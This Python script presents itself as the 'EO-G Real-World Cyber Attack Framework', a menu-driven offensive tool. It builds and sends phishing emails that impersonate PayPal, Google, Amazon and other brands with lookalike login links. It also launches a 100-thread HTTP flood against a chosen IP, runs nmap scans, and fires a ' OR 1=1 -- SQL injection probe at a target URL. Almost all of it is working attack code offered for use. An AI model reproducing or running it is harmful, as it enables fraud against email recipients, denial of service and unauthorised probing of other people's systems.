import os
import threading
import requests
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import subprocess

class EO_G:
    def __init__(self):
        self.modes = {
            1: "Phishing Attack",
            2: "DDoS Attack",
            3: "Network Scan (Nmap)",
            4: "Website Attack (SQL Injection / XSS)",
            5: "Exit"
        }

    def display_banner(self):
        """Displays a banner."""
        print("""
 ███████╗ ██████╗       ██████╗  ██████╗ 
 ██╔════╝██╔═══██╗     ██╔═══██╗██╔═══██╗
 █████╗  ██║   ██║     ██║   ██║██║   ██║
 ██╔══╝  ██║   ██║     ██║   ██║██║   ██║
 ██║     ╚██████╔╝     ╚██████╔╝╚██████╔╝
 ╚═╝      ╚═════╝       ╚═════╝  ╚═════╝
      Real-World Cyber Attack Framework
        """)

    def phishing_attack(self):
        """Performs a real phishing attack by sending a malicious email."""
        print("[EO-G] Initiating Phishing Attack...")

        domain = random.choice(["paypal", "google", "amazon", "facebook", "instagram"])
        phishing_url = f"https://{domain}-secure-login.com"

        subject = "Urgent: Account Verification Needed"
        body = f"""
        Dear User,

        We've detected unusual activity on your {domain} account. Please click the link below to secure your account:

        {phishing_url}

        Regards,
        {domain} Security Team
        """

        # Send the phishing email (configure your sender email and SMTP settings)
        target_email = "victim@example.com"  # Replace with actual target email
        self.send_phishing_email(target_email, subject, body)

    def send_phishing_email(self, target_email, subject, body):
        """Sends the phishing email."""
        sender_email = "your_email@example.com"  # Replace with your real email
        password = "your_email_password"  # Replace with your real email password
        smtp_server = "smtp.example.com"  # Replace with correct SMTP server for your email provider
        smtp_port = 587  # Usually 587 for TLS

        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = target_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()  # Secure connection
                server.login(sender_email, password)
                server.sendmail(sender_email, target_email, msg.as_string())
            print(f"[EO-G] Phishing email sent to {target_email} successfully.")
        except Exception as e:
            print(f"Error sending phishing email: {e}")

    def ddos_attack(self, target_ip):
        """Launches a real DDoS attack on the target IP."""
        print(f"[EO-G] Initiating DDoS attack on {target_ip}...")

        def ddos_thread():
            """Sends HTTP GET requests to flood the target with traffic."""
            while True:
                try:
                    requests.get(f"http://{target_ip}")
                except requests.exceptions.RequestException as e:
                    print(f"Error in DDoS thread: {e}")

        # Launch multiple threads to simulate a real DDoS attack from many sources
        threads = []
        for _ in range(100):  # Adjust the number of threads as needed
            thread = threading.Thread(target=ddos_thread)
            threads.append(thread)
            thread.start()

        print(f"[EO-G] DDoS attack launched on {target_ip}.")

    def network_scan(self, target_ip_range):
        """Launches a real network attack using Nmap to discover devices."""
        print(f"[EO-G] Scanning network in range: {target_ip_range}")
        try:
            devices = subprocess.check_output(f"nmap -sP {target_ip_range}", shell=True).decode()
            print(devices)
            return devices
        except Exception as e:
            print(f"Error during network scan: {e}")
            return f"Error during network scan: {e}"

    def website_attack(self, target_url):
        """Launches a real website attack like SQL Injection or XSS."""
        print(f"[EO-G] Initiating website attack on {target_url}...")

        # Example of SQL Injection attempt
        payload = "' OR 1=1 --"
        sql_injection_url = f"{target_url}?id={payload}"

        try:
            response = requests.get(sql_injection_url)
            if "SQL syntax" in response.text or "error" in response.text:
                print("[EO-G] SQL Injection successful: Vulnerable to SQL Injection.")
            else:
                print("[EO-G] SQL Injection failed: No vulnerability detected.")
        except Exception as e:
            print(f"Error during website attack: {e}")

    def execute(self):
        """Main execution loop."""
        self.display_banner()
        print("[EO-G] Welcome to EO-G: Real-World Cyber Attack Framework")

        while True:
            print("\n[EO-G] Select an option:")
            for num, mode in self.modes.items():
                print(f" {num}: {mode}")
            try:
                choice = int(input("[EO-G] Enter the number of your choice: "))
                if choice == 1:
                    self.phishing_attack()  # Trigger real phishing attack
                elif choice == 2:
                    target_ip = input("[EO-G] Enter target IP for DDoS attack: ")
                    self.ddos_attack(target_ip)  # Trigger real DDoS attack
                elif choice == 3:
                    target_ip_range = input("[EO-G] Enter IP range for network attack (e.g., 192.168.1.0/24): ")
                    self.network_scan(target_ip_range)  # Trigger real network attack
                elif choice == 4:
                    target_url = input("[EO-G] Enter target URL for website attack: ")
                    self.website_attack(target_url)  # Trigger website attack (SQL/XSS)
                elif choice == 5:
                    print("[EO-G] Exiting... Goodbye!")
                    break
                else:
                    print("[EO-G] Invalid choice. Please try again.")
            except ValueError:
                print("[EO-G] Invalid input. Please enter a valid number.")

if __name__ == "__main__":
    eo_g = EO_G()
    eo_g.execute()
